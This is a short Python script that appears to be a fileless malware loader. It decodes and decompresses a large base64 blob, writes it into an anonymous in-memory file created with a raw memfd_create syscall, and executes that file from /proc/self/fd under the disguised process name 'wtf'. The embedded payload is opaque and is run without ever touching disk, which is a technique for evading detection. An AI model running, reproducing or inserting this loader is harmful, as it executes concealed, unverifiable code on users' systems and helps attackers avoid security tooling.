import ctypes, os, base64, zlib
l = ctypes.CDLL(None)
s = l.syscall
c = base64.b64decode(
b'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'
)
e = zlib.decompress(c)
f = s(319, '', 1)
os.write(f, e)
p = '/proc/self/fd/%d' % f
os.execle(p, 'wtf', {})
